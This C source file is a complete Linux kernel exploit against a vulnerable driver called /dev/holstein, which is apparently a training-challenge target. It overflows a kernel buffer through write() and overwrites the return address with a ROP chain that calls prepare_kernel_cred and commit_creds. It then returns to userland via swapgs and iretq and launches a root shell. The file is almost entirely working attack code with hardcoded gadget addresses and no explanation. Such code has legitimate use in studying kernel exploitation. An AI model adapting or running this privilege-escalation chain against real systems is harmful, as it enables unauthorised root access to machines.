#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VULN_DRV = "/dev/holstein";
void spawn_shell();

int64_t global_fd = 0;

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff8106e240;
uint64_t commit_creds = 0xffffffff8106e390;
uint64_t pop_rdi_ret = 0xffffffff8127bbdc;
uint64_t mov_rdi_rax_ret = 0xffffffff8160c96b;
uint64_t pop_rcx_ret = 0xffffffff812ea083;
uint64_t iretq = 0xffffffff81343b12;
uint64_t swapgd = 0xffffffff8160bfac;
uint64_t user_rip = (uint64_t)spawn_shell;

void open_dev() {
  global_fd = open(VULN_DRV, O_RDWR);
  if (global_fd < 0) {
    printf("[!] failed to open %s\n", VULN_DRV);
    exit(-1);
  } else {
    printf("[+] successfully opened %s\n", VULN_DRV);
  }
}

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
  puts("[+] win!");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

void overwrite_ret() {
  puts("[*] trying to overwrite return address of write op");
  uint64_t ret_off = 0x408;
  char payload[0x500];
  memset(payload, 'A', ret_off);
  //   *(uint64_t *)&payload[ret_off] = (uint64_t)privesc; // return address
  uint64_t *rop_chain = (uint64_t *)&payload[ret_off];
  *rop_chain++ = pop_rdi_ret;
  *rop_chain++ = 0;
  *rop_chain++ = prepare_kernel_cred;
  *rop_chain++ = pop_rcx_ret;
  *rop_chain++ = 0;
  *rop_chain++ = mov_rdi_rax_ret;
  *rop_chain++ = commit_creds;
  *rop_chain++ = swapgd;
  *rop_chain++ = iretq;
  *rop_chain++ = user_rip;
  *rop_chain++ = user_cs;
  *rop_chain++ = user_rflags;
  *rop_chain++ = user_sp;
  *rop_chain++ = user_ss;

  uint64_t data = write(global_fd, payload, sizeof(payload));

  puts("[-] if you can read this we failed the mission :(");
}

int main(int argc, char **argv) {
  open_dev();
  save_userland_state();
  overwrite_ret();
  close(global_fd);

  return 0;
}